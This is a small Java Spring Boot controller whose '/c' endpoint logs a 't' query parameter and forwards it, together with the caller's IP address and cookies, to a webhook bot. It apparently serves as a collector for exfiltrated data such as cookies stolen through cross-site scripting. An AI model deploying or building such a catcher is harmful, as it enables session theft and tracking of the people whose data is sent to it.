package com.example.herokuspringboot;

import java.util.Arrays;
import javax.servlet.http.HttpServletRequest;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@Slf4j
@RestController
public class CollectorController {

    private final WebhookBot webhookBot;

    public CollectorController(WebhookBot webhookBot) {
        this.webhookBot = webhookBot;
    }

    @GetMapping("/c")
    void ping(@RequestParam("t") String text,
              HttpServletRequest httpServletRequest) {
        log.debug("{}", text);
        webhookBot.sendMessage(text + " " + httpServletRequest.getRemoteAddr() + " " + Arrays.asList(httpServletRequest.getCookies()));
    }

}
